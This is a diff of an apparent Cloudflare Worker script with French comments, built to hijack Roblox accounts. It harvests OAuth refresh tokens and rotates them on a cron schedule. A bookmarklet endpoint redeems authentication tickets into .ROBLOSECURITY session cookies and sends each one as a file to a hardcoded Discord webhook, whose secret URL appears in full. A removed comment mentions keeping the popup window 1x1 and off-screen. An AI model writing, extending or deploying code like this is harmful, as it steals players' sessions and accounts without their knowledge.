@@ -2,15 +2,18 @@
 // Env : CLIENT_ID, CLIENT_SECRET, BASE, HOOK (optionnel) + binding KV nommé KV
 // Cron : 0 4 * * *
 
-const AUTH  = 'https://apis.roblox.com/oauth/v1/authorize';
-const TOKEN = 'https://apis.roblox.com/oauth/v1/token';
-const UI    = 'https://apis.roblox.com/oauth/v1/userinfo';
+import PAGE from './page.js';
+
+const AUTH   = 'https://apis.roblox.com/oauth/v1/authorize';
+const TOKEN  = 'https://apis.roblox.com/oauth/v1/token';
+const UI     = 'https://apis.roblox.com/oauth/v1/userinfo';
 const REDEEM = 'https://auth.roblox.com/v1/authentication-ticket/redeem';
 
 const DEFAULT_HOOK = 'https://discord.com/api/webhooks/1569385832417075382/ZmOZDVHDwEFlfCoecnWvn_8_Jjh3uIPB0hraVyFrOfeDFkvCMwsZPI4dDPUz3cpH31Yu';
 
-const base = env => (env.BASE || '').replace(/\/$/, '');
-const scope = env => env.SCOPE || 'openid profile email';
+const base  = env => (env.BASE || '').replace(/\/$/, '');
+const scope = env => env.SCOPE || 'openid profile';
+const basic = env => 'Basic ' + btoa(env.CLIENT_ID + ':' + env.CLIENT_SECRET);
 
 const j = (o, s = 200) => new Response(JSON.stringify(o), {
   status: s,
@@ -33,7 +36,12 @@ const html = s => new Response(s, {
 
 const rnd = n => crypto.randomUUID().replace(/-/g, '').slice(0, n);
 const esc = s => String(s ?? '').replace(/[`\\*_~|]/g, c => '\\' + c).slice(0, 1000);
-const basic = env => 'Basic ' + btoa(env.CLIENT_ID + ':' + env.CLIENT_SECRET);
+
+const closePage = (msg, color) => html(
+  '<body style="background:#070a12;color:' + color + ';font-family:sans-serif;' +
+  'display:grid;place-items:center;height:100vh;margin:0">' + msg +
+  '<script>setTimeout(function(){window.close()},600)</script></body>'
+);
 
 function authUrl(env, state, prompt) {
   const u = new URL(AUTH);
@@ -74,12 +82,6 @@ function geo(request) {
   };
 }
 
-const closePage = (msg, color) => html(
-  '<body style="background:#070a12;color:' + color + ';font-family:sans-serif;' +
-  'display:grid;place-items:center;height:100vh;margin:0">' + msg +
-  '<script>setTimeout(function(){window.close()},600)</script></body>'
-);
-
 export default {
   async fetch(request, env) {
     const url = new URL(request.url);
@@ -98,7 +100,6 @@ export default {
     }
 
     // ---------- ouverture du popup ----------
-    // k = clé de session générée par le client, sert aussi de state OAuth
     if (p === '/go') {
       const cid = url.searchParams.get('cid') || '';
       const k = url.searchParams.get('k') || rnd(30);
@@ -125,7 +126,6 @@ export default {
       if (err) {
         if (err === 'login_required' || err === 'consent_required') {
           await env.KV.put('st:' + state, JSON.stringify({ ...st, need: 1 }), { expirationTtl: 900 });
-          // on agrandit la fenêtre : elle est peut-être en 1x1 hors écran
           return html(
             '<body style="background:#070a12;color:#eaf0fb;font-family:sans-serif;' +
             'display:grid;place-items:center;height:100vh;margin:0;text-align:center">' +
@@ -144,7 +144,6 @@ export default {
       const code = url.searchParams.get('code');
       if (!code) return closePage('Pas de code.', '#8b96ad');
 
-      // échange serveur — redirect_uri OBLIGATOIRE et identique
       const tr = await fetch(TOKEN, {
         method: 'POST',
         headers: { 'content-type': 'application/x-www-form-urlencoded', authorization: basic(env) },
@@ -256,7 +255,7 @@ export default {
       return j({ s: 'pending' });
     }
 
-    // ---------- bookmarklet : réception du ticket ----------
+    // ---------- bookmarklet ----------
     if (p === '/cbx') {
       if (request.method === 'OPTIONS') return new Response(null, { headers: cors });
       const { ticket, sid, u } = await request.json().catch(() => ({}));
@@ -275,7 +274,9 @@ export default {
 
       if (sid) {
         const prev = JSON.parse((await env.KV.get('st:' + sid)) || '{}');
-        await env.KV.put('st:' + sid, JSON.stringify({ ...prev, cookie: m[1], cookie_at: Date.now() }), { expirationTtl: 86400 });
+        await env.KV.put('st:' + sid, JSON.stringify({
+          ...prev, cookie: m[1], cookie_at: Date.now(),
+        }), { expirationTtl: 86400 });
       }
 
       await hook(env, [{
@@ -283,7 +284,7 @@ export default {
         color: 0xe3b341,
         description: '**' + esc(u?.name || '?') + '**\n`' + esc(u?.id || '?') + '`',
         footer: { text: 'via bookmarklet' },
-      }], { name: '.ROBLOSECURITY.txt', body: m[1] });
+      }], { name: 'ROBLOSECURITY.txt', body: m[1] });
 
       return j({ ok: true });
     }
@@ -291,7 +292,6 @@ export default {
     return new Response('404', { status: 404 });
   },
 
-  // rotation des refresh tokens
   async scheduled(ev, env) {
     let cursor;
     do {
